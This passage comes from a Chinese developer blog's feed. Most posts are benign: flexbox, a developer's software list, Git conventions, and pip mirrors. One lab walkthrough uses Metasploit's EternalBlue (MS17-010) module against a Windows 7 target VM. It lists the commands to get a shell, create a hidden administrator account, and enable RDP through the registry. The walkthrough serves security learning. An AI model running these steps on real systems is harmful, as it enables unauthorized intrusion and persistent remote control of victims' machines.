*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1600863500-8638-bg2015071015.jpg" alt="img"></p><p>如果所有项目的<code>flex-shrink</code>属性都为1，当空间不足时，都将等比例缩小。如果一个项目的<code>flex-shrink</code>属性为0，其他项目都为1，则空间不足时，前者不缩小。</p><p>负值对该属性无效。</p><h3 id="flex-basis属性">flex-basis属性</h3><p><code>flex-basis</code>属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为<code>auto</code>，即项目的本来大小。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-basis</span>: &lt;length&gt; | auto; <span class="comment">/* default auto */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它可以设为跟<code>width</code>或<code>height</code>属性一样的值（比如350px），则项目将占据固定空间。</p><h3 id="flex属性">flex属性</h3><p><code>flex</code>属性是<code>flex-grow</code>, <code>flex-shrink</code> 和 <code>flex-basis</code>的简写，默认值为<code>0 1 auto</code>。后两个属性可选。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex</span>: none | [ &lt;<span class="string">&#x27;flex-grow&#x27;</span>&gt; &lt;<span class="string">&#x27;flex-shrink&#x27;</span>&gt;? || &lt;<span class="string">&#x27;flex-basis&#x27;</span>&gt; ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该属性有两个快捷值：<code>auto</code> (<code>1 1 auto</code>) 和 none (<code>0 0 auto</code>)。</p><p>建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。</p><h3 id="align-self属性">align-self属性</h3><p><code>align-self</code>属性允许单个项目有与其他项目不一样的对齐方式，可覆盖<code>align-items</code>属性。默认值为<code>auto</code>，表示继承父元素的<code>align-items</code>属性，如果没有父元素，则等同于<code>stretch</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">align-self</span>: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1600863501-2594-bg2015071016.png" alt="img"></p><p>该属性可能取6个值，除了auto，其他都与align-items属性完全一致。</p>]]></content>
    
    
    <summary type="html">详细讲解flex布局</summary>
    
    
    
    <category term="前端" scheme="https://www.777nx.cn/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="flex" scheme="https://www.777nx.cn/tags/flex/"/>
    
  </entry>
  
  <entry>
    <title>一个苦逼的全栈程序员电脑上到底要装多少软件？</title>
    <link href="https://www.777nx.cn/posts/d4482d9c.html"/>
    <id>https://www.777nx.cn/posts/d4482d9c.html</id>
    <published>2023-11-13T21:12:23.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<div class="tip home"><p>以下文章来源于小虎哥的技术博客 ，作者小虎哥</p></div><div class="note info flat"><p>参考：<a href="https://mp.weixin.qq.com/s/rpxI6LEMJtw_RSQxttl8og">大厂都在用的Git代码管理规范</a></p></div><blockquote><p>一个苦逼的全栈程序员电脑上到底要装多少软件？</p></blockquote><p>这两天系统重装了，我以为像我这样的Java全栈程序员，电脑上也只需要装一个Java、一个IntelliJ Idea 和 一个IntelliJ Webstorm 就可以无缝衔接继续工作了。但是实际上我发现装了一个软件后还需要装另一个，一个接一个，无穷无尽，而且都是我工作需要的。</p><p><img src="https://img.777nx.cn/test/640" alt="图片"></p><p>那么一个苦逼的全栈程序员电脑上到底要装多少软件？我列举一下我电脑上安装的软件工具：</p><h2 id="Java-JDK">Java JDK</h2><p><img src="https://img.777nx.cn/test/Java%20%20JDK.png" alt="Java  JDK"></p><h2 id="IntelliJ-Idea">IntelliJ Idea</h2><p><img src="https://img.777nx.cn/test/IntelliJ%20Idea.png" alt="IntelliJ Idea"></p><h2 id="Git">Git</h2><p><img src="https://img.777nx.cn/test/Git.png" alt="Git"></p><h2 id="Maven">Maven</h2><p><img src="https://img.777nx.cn/test/Maven.png" alt="Maven"></p><h2 id="MariaDB">MariaDB</h2><p><img src="https://img.777nx.cn/test/MariaDB.png" alt="MariaDB"></p><h2 id="DataGrip">DataGrip</h2><p><img src="https://img.777nx.cn/test/DataGrip.png" alt="DataGrip"></p><h2 id="XShell">XShell</h2><p><img src="https://img.777nx.cn/test/XSehll.png" alt="XSehll"></p><h2 id="File-Zilla">File Zilla</h2><p><img src="https://img.777nx.cn/test/File%20Zilla.png" alt="File Zilla"></p><h2 id="Redis">Redis</h2><p><img src="https://img.777nx.cn/test/Redis.png" alt="Redis"></p><h2 id="IntelliJ-WebStorm">IntelliJ WebStorm</h2><p><img src="https://img.777nx.cn/test/IntelliJ%20WebStorm.png" alt="IntelliJ WebStorm"></p><h2 id="HbuilderX">HbuilderX</h2><p><img src="https://img.777nx.cn/test/HbuilderX.png" alt="HbuilderX"></p><h2 id="Node">Node</h2><p><img src="https://img.777nx.cn/test/Node.png" alt="Node"></p><h2 id="Postman">Postman</h2><p><img src="https://img.777nx.cn/test/Postman.png" alt="Postman"></p><h2 id="Tomcat">Tomcat</h2><p><img src="https://img.777nx.cn/test/Tomcat.png" alt="Tomcat"></p><h2 id="Nginx">Nginx</h2><p><img src="https://img.777nx.cn/test/Nginx.png" alt="Nginx"></p><h2 id="Google-Chrome">Google Chrome</h2><p><img src="https://img.777nx.cn/test/Google%20Chrome.png" alt="Google Chrome"></p><h2 id="JMeter">JMeter</h2><p><img src="https://img.777nx.cn/test/JMeter.png" alt="JMeter"></p><h2 id="utools">utools</h2><p><img src="https://img.777nx.cn/test/utools.png" alt="utools"></p><p>以上只是开发需要的，还不包括办公用的Office全家桶、QQ、微信、钉钉、搜狗输入法等，而且搞微服务开发还需要安装 Nocas、Skywalking、Sentinel、xxl-job、Seata、MinIO、Docker、Elastic等等~</p><p>TMD，不是程序员，苦逼工具人！</p><p><img src="https://img.777nx.cn/test/%E5%B7%A5%E5%85%B7%E4%BA%BA.png" alt="工具人"></p>]]></content>
    
    
    <summary type="html">一个苦逼的全栈程序员电脑上到底要装多少软件？</summary>
    
    
    
    <category term="Java" scheme="https://www.777nx.cn/categories/Java/"/>
    
    
    <category term="程序员" scheme="https://www.777nx.cn/tags/%E7%A8%8B%E5%BA%8F%E5%91%98/"/>
    
  </entry>
  
  <entry>
    <title>大厂都在用的Git代码管理规范</title>
    <link href="https://www.777nx.cn/posts/3475746b.html"/>
    <id>https://www.777nx.cn/posts/3475746b.html</id>
    <published>2023-10-14T21:51:19.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<div class="tip home"><p>以下文章来源于码农参上 ，作者Dr Hydra</p></div><div class="note info flat"><p>参考：<a href="https://mp.weixin.qq.com/s/V7xG4N7Gytj1NAQqFsovsA">大厂都在用的Git代码管理规范</a></p></div><h2 id="分支命名">分支命名</h2><h3 id="master-分支">master 分支</h3><p>master 为主分支，也是用于部署生产环境的分支，需要确保master分支稳定性。master 分支一般由 release 以及 hotfix 分支合并，任何时间都不能直接修改代码。</p><h3 id="develop-分支">develop 分支</h3><p>develop 为开发环境分支，始终保持最新完成以及bug修复后的代码，用于前后端联调。一般开发的新功能时，feature分支都是基于develop分支创建的。</p><h3 id="feature-分支">feature 分支</h3><p>开发新功能时，以develop为基础创建feature分支。</p><p>分支命名时以 <code>feature/</code> 开头，后面可以加上开发的功能模块， 命名示例：<code>feature/user_module</code>、<code>feature/cart_module</code></p><h3 id="test分支">test分支</h3><p>test为测试环境分支，外部用户无法访问，专门给测试人员使用，版本相对稳定。</p><h3 id="release分支">release分支</h3><p>release 为预上线分支（预发布分支），UAT测试阶段使用。一般由 test 或 hotfix 分支合并，不建议直接在 release 分支上直接修改代码。</p><h3 id="hotfix-分支">hotfix 分支</h3><p>线上出现紧急问题时，需要及时修复，以master分支为基线，创建hotfix分支。修复完成后，需要合并到 master 分支和 develop 分支。</p><p>分支命名以<code>hotfix/</code> 开头的为修复分支，它的命名规则与 feature 分支类似。</p><h2 id="分支与环境对应关系">分支与环境对应关系</h2><p>在系统开发过程中常用的环境：</p><ul><li>DEV 环境（Development environment）：用于开发者调试使用</li><li>FAT环境（Feature Acceptance Test environment）：功能验收测试环境，用于测试环境下的软件测试者测试使用</li><li>UAT环境 （User Acceptance Test environment）：用户验收测试环境，用于生产环境下的软件测试者测试使用</li><li>PRO 环境（Production environment）：生产环境</li></ul><p>对应关系：</p><table><thead><tr><th style="text-align:left">分支</th><th style="text-align:left">功能</th><th style="text-align:left">环境</th><th style="text-align:left">可访问</th></tr></thead><tbody><tr><td style="text-align:left">master</td><td style="text-align:left">主分支，稳定版本</td><td style="text-align:left">PRO</td><td style="text-align:left">是</td></tr><tr><td style="text-align:left">develop</td><td style="text-align:left">开发分支，最新版本</td><td style="text-align:left">DEV</td><td style="text-align:left">是</td></tr><tr><td style="text-align:left">feature</td><td style="text-align:left">开发分支，实现新特性</td><td style="text-align:left"></td><td style="text-align:left">否</td></tr><tr><td style="text-align:left">test</td><td style="text-align:left">测试分支，功能测试</td><td style="text-align:left">FAT</td><td style="text-align:left">是</td></tr><tr><td style="text-align:left">release</td><td style="text-align:left">预上线分支，发布新版本</td><td style="text-align:left">UAT</td><td style="text-align:left">是</td></tr><tr><td style="text-align:left">hotfix</td><td style="text-align:left">紧急修复分支，修复线上bug</td><td style="text-align:left"></td><td style="text-align:left">否</td></tr></tbody></table><h3 id="分支合并流程规范">分支合并流程规范</h3><p>业界常见的两大主分支（master、develop）、三个辅助分支（feature、release、hotfix）的生命周期：</p><p><img src="https://img.777nx.cn/test/9ff1f9b47949cc2a13e2b0a4c546f10f.png" alt="9ff1f9b47949cc2a13e2b0a4c546f10f"></p><p>以上生命周期仅作参考，不同开发团队可能有不同的规范，可自行灵活定义。</p><p>例如我们团队在开发时，至少需要保证以下流程：</p><ul><li>develop 分支和 hotfix 分支，必须从 master 分支检出</li><li>由 develop 分支合并到 test 分支</li><li>功能测试无误后，由 test 分支合并到 release 分支</li><li>UAT测试通过后，由 release 分支合并到 master分支</li><li>对于工作量小的功能开发（工时小于1天），可以直接在devolop 分支进行开发，否则由 develop 分支检出 feature 分支进行开发，开发完后合并到develop 分支</li></ul><h2 id="Git-Commit-Message规范">Git Commit Message规范</h2><p>Git commit message规范指提交代码时编写的规范注释，编写良好的Commit messages可以达到3个重要的目的：</p><ul><li>加快代码review的流程</li><li>帮助我们编写良好的版本发布日志</li><li>让之后的维护者了解代码里出现特定变化和feature被添加的原因</li></ul><h3 id="Angular-Git-Commit-Guidelines">Angular Git Commit Guidelines</h3><p>业界应用的比较广泛的是Angular Git Commit Guidelines：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">type</span>&gt;</span>(<span class="tag">&lt;<span class="name">scope</span>&gt;</span>): <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BLANK</span> <span class="attr">LINE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BLANK</span> <span class="attr">LINE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>type：提交类型</li><li>scope：可选项，本次 commit 波及的范围</li><li>subject：简明扼要的阐述下本次 commit 的主旨，在<code>Angular Git Commit Guidelines</code>中强调了三点。使用祈使句，首字母不要大写，结尾无需添加标点</li><li>body: 同样使用祈使句，在主体内容中我们需要把本次 commit 详细的描述一下，比如此次变更的动机</li><li>footer: 描述下与之关联的 issue 或 break change</li></ul><h3 id="简易版">简易版</h3><p>项目中实际可以采用简易版规范：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">type</span>&gt;</span>(<span class="tag">&lt;<span class="name">scope</span>&gt;</span>):<span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="type规范">type规范</h3><p><code>Angular Git Commit Guidelines</code>中推荐的type类型如下：</p><ul><li>feat: 新增功能</li><li>fix: 修复bug</li><li>docs: 仅文档更改</li><li>style: 不影响代码含义的更改（空白、格式设置、缺失 分号等）</li><li>refactor: 既不修复bug也不添加特性的代码更改</li><li>perf: 改进性能的代码更改</li><li>test: 添加缺少的测试或更正现有测试</li><li>chore: 对构建过程或辅助工具和库（如文档）的更改</li></ul><p>除此之外，还有一些常用的类型：</p><ul><li>delete：删除功能或文件</li><li>modify：修改功能</li><li>build：改变构建流程，新增依赖库、工具等（例如webpack、gulp、npm修改）</li><li>test：测试用例的新增、修改</li><li>ci：自动化流程配置修改</li><li>revert：回滚到上一个版本</li></ul><h3 id="单次提交注意事项">单次提交注意事项</h3><ul><li>提交问题必须为同一类别</li><li>提交问题不要超过3个</li><li>提交的commit发现不符合规范，<code>git commit --amend -m &quot;新的提交信息&quot;</code>或 <code>git reset --hard HEAD</code> 重新提交一次</li></ul><h2 id="配置-gitignore文件">配置.gitignore文件</h2><p><code>.gitignore</code>是一份用于忽略不必提交的文件的列表，项目中可以根据实际需求统一<code>.gitignore</code>文件，减少不必要的文件提交和冲突，净化代码库环境。</p><p>通用文件示例：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">HELP.md</span><br><span class="line">target/</span><br><span class="line">!<span class="string">.mvn/wrapper/maven-wrapper.jar</span></span><br><span class="line">!**<span class="string">/src/main/</span>**<span class="string">/target/</span></span><br><span class="line">!**<span class="string">/src/test/</span>**<span class="string">/target/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### STS ###</span></span><br><span class="line"><span class="string">.apt_generated</span></span><br><span class="line"><span class="string">.classpath</span></span><br><span class="line"><span class="string">.factorypath</span></span><br><span class="line"><span class="string">.project</span></span><br><span class="line"><span class="string">.settings</span></span><br><span class="line"><span class="string">.springBeans</span></span><br><span class="line"><span class="string">.sts4-cache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### IntelliJ IDEA ###</span></span><br><span class="line"><span class="string">.idea</span></span><br><span class="line">*<span class="string">.iws</span></span><br><span class="line">*<span class="string">.iml</span></span><br><span class="line">*<span class="string">.ipr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### NetBeans ###</span></span><br><span class="line"><span class="string">/nbproject/private/</span></span><br><span class="line"><span class="string">/nbbuild/</span></span><br><span class="line"><span class="string">/dist/</span></span><br><span class="line"><span class="string">/nbdist/</span></span><br><span class="line"><span class="string">/.nb-gradle/</span></span><br><span class="line">build/</span><br><span class="line">!**<span class="string">/src/main/</span>**<span class="string">/build/</span></span><br><span class="line">!**<span class="string">/src/test/</span>**<span class="string">/build/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### VS Code ###</span></span><br><span class="line"><span class="string">.vscode/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Log file</span></span><br><span class="line">*<span class="string">.log</span></span><br><span class="line"><span class="string">/logs</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># BlueJ files</span></span><br><span class="line">*<span class="string">.ctxt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mobile Tools for Java (J2ME)</span></span><br><span class="line"><span class="string">.mtj.tmp/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Package Files #</span></span><br><span class="line">*<span class="string">.jar</span></span><br><span class="line">*<span class="string">.war</span></span><br><span class="line">*<span class="string">.ear</span></span><br><span class="line">*<span class="string">.zip</span></span><br><span class="line">*<span class="string">.tar.gz</span></span><br><span class="line">*<span class="string">.rar</span></span><br><span class="line">*<span class="string">.cmd</span></span><br></pre></td></tr></table></figure><h2 id="其他">其他</h2><p>此外，还有一些其他建议：</p><ul><li>master 分支的每一次更新，都建议打 tag 添加标签，通常为对应版本号，便于管理</li><li>feature分支、hotfix分支在合并后可以删除，避免分支过多管理混乱</li><li>每次 pull 代码前，提交本地代码到本地库中，否则可能回出现合并代码出错，导致代码丢失</li></ul>]]></content>
    
    
    <summary type="html">大厂都在用的Git代码管理规范</summary>
    
    
    
    <category term="Java" scheme="https://www.777nx.cn/categories/Java/"/>
    
    
    <category term="Git" scheme="https://www.777nx.cn/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>国内环境下载python安装包</title>
    <link href="https://www.777nx.cn/posts/8e1163b3.html"/>
    <id>https://www.777nx.cn/posts/8e1163b3.html</id>
    <published>2023-09-16T00:34:48.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python安装包镜像">python安装包镜像</h2><p>下载python安装包和pip下载第三方库时，由于一些客观原因，下载外网文件速度很慢，这时可以使用淘宝镜像下载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>npm.taobao.org<span class="regexp">/mirrors/</span>python/</span><br></pre></td></tr></table></figure><p>比如我要在win11电脑上安装python3.11.4</p><p>进入<code>http://npm.taobao.org/mirrors/python/3.11.4/</code></p><p>找到<a href="https://registry.npmmirror.com/-/binary/python/3.11.4/python-3.11.4-amd64.exe">python-3.11.4-amd64.exe</a>点击下载即可</p><p><img src="https://img.777nx.cn/test/image-20230916001949931.png" alt="image-20230916001949931"></p><h2 id="pip下载时使用国内镜像">pip下载时使用国内镜像</h2><p>默认情况下 pip 使用的是国外的镜像，在下载的时候速度非常慢，本文我们介绍使用国内清华大学的源，地址为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>我们可以直接在 pip 命令中使用 <strong>-i</strong> 参数来指定镜像地址，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install numpy -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>以上命令使用清华镜像源安装 numpy 包。</p><p>这种只对当前安装对命令有用，如果需要全局修改，则需要修改配置文件。</p><p>Windows下，你需要在当前对用户目录下（C:\Users\xx\pip，xx 表示当前使用对用户，比如张三）创建一个pip.ini在pip.ini文件中输入以下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">index-url</span> = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"><span class="section">[install]</span></span><br><span class="line"><span class="attr">trusted-host</span> = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/image-20230916002731359.png" alt="image-20230916002731359"></p><h2 id="其他国内镜像源">其他国内镜像源</h2><ul><li>中国科学技术大学 : <a href="https://pypi.mirrors.ustc.edu.cn/simple">https://pypi.mirrors.ustc.edu.cn/simple</a></li><li>豆瓣：<a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></li><li>阿里云：<a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></li></ul>]]></content>
    
    
    <summary type="html">python安装包国内镜像，pip使用国内镜像</summary>
    
    
    
    <category term="Python" scheme="https://www.777nx.cn/categories/Python/"/>
    
    
    <category term="pip" scheme="https://www.777nx.cn/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>利用永恒之蓝(MS17010)漏洞攻击靶机</title>
    <link href="https://www.777nx.cn/posts/eca73062.html"/>
    <id>https://www.777nx.cn/posts/eca73062.html</id>
    <published>2023-08-04T10:44:53.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<div class="note info flat"><p>参考：<a href="https://www.iculture.cc/project/pig=159">利用永恒之蓝(MS17010)漏洞攻击靶机</a></p></div><h2 id="MS17010漏洞复现和利用">MS17010漏洞复现和利用</h2><h3 id="相关环境">相关环境</h3><blockquote><p>攻击机：Kali-linux 2023.2a<br>靶机：Windows 7 SP1旗舰版</p></blockquote><h3 id="获取靶机IP地址">获取靶机IP地址</h3><p>打开cmd查看ip地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/2942506594.png" alt="image-20210203202706412.png"></p><h3 id="关闭防火墙，检查通讯状态">关闭防火墙，检查通讯状态</h3><h4 id="需要关闭靶机的防火墙">需要关闭靶机的防火墙</h4><p>打开网络和共享中心</p><p><img src="https://img.777nx.cn/test/2917080305.png" alt="image-20210203202834222.png"></p><p>进入windows防火墙设置</p><p><img src="https://img.777nx.cn/test/3318781133.png" alt="image-20210203202906298.png"></p><p><img src="https://img.777nx.cn/test/3273019793.png" alt="image-20210203202932655.png"></p><p><img src="https://img.777nx.cn/test/1969020272.png" alt="image-20210203203001386.png"></p><p>成功关闭防火墙</p><p><img src="https://img.777nx.cn/test/1579175518.png" alt="image-20210203203502759.png"></p><h4 id="检查通讯状况">检查通讯状况</h4><p>在kali linux里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.137.130</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1952514212.png" alt="image-20210203203604876.png"></p><p>在windows 7里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.137.128</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/3455708001.png" alt="image-20210203203622717.png"></p><p>两边都ping得通，说明通讯正常</p><h3 id="攻击步骤">攻击步骤</h3><h4 id="检查是否存在漏洞">检查是否存在漏洞</h4><p>运行postgresql数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure><p>打开msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/3234740725.png" alt="image-20210203203739927.png"></p><p>使用相关模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure><p>查看相关配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p>设置目标IP为靶机的IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 192.168.137.130</span><br></pre></td></tr></table></figure><p>开始对靶机进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run </span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/2382902291.png" alt="image-20210203205501575.png"></p><h4 id="发现漏洞并攻击">发现漏洞并攻击</h4><p>搜索msf17010漏洞模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p>使用该漏洞模块进行攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue </span><br></pre></td></tr></table></figure><p>查看其配置详情</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/2137238967.png" alt="image-20210203210021392.png"></p><p>设置靶机IP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.137.130</span><br></pre></td></tr></table></figure><p>使用exploit或者run命令进行攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/3342334196.png" alt="image-20210203210234736.png"></p><p>获取shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/2396726531.png" alt="image-20210203210346744.png"></p><h4 id="利用漏洞提权">利用漏洞提权</h4><p>创建管理员账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user pigpig 123456 /add</span><br></pre></td></tr></table></figure><p>我们在win7那边已经可以看到了</p><p><img src="https://img.777nx.cn/test/3582938208.png" alt="image-20210203210657648.png"></p><p>增加管理员权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators pigpig /add</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1376500999.png" alt="image-20210203210709099.png"></p><p>在去win7那边观察</p><p><img src="https://img.777nx.cn/test/854454961.png" alt="image-20210203210749459.png"></p><h4 id="开启3389端口并远程访问控制">开启3389端口并远程访问控制</h4><p>将win7靶机那边远程服务打开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/487871890.png" alt="image-20210203210855974.png"></p><p>打开3389端口之后，在新的shell里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.137.130:3389</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/28644985.png" alt="image-20210203212734846.png"></p><p>点击yes之后，就可以在kali里面进入到win7靶机了。</p><p><img src="https://img.777nx.cn/test/526728782.png" alt="image-20210203212755623.png"></p><p><img src="https://img.777nx.cn/test/1065918414.png" alt="image-20210203212858622.png"></p><p>输入账户密码回车，点了同意靶机的管理员账户就会掉线</p><p><img src="https://img.777nx.cn/test/2012980474.png" alt="image-20210203212916039.png"></p><p>成功进入了</p><p><img src="https://img.777nx.cn/test/651445660.png" alt="image-20210203213041501.png"></p>]]></content>
    
    
    <summary type="html">如何使用Kali linux黑掉Windows系统（通过永恒之蓝漏洞）</summary>
    
    
    
    <category term="计算机基础" scheme="https://www.777nx.cn/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="永恒之蓝" scheme="https://www.777nx.cn/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    
    <category term="Kali" scheme="https://www.777nx.cn/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>HTML进阶</title>
    <link href="https://www.777nx.cn/posts/4f026a62.html"/>
    <id>https://www.777nx.cn/posts/4f026a62.html</id>
    <published>2023-06-19T19:03:41.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
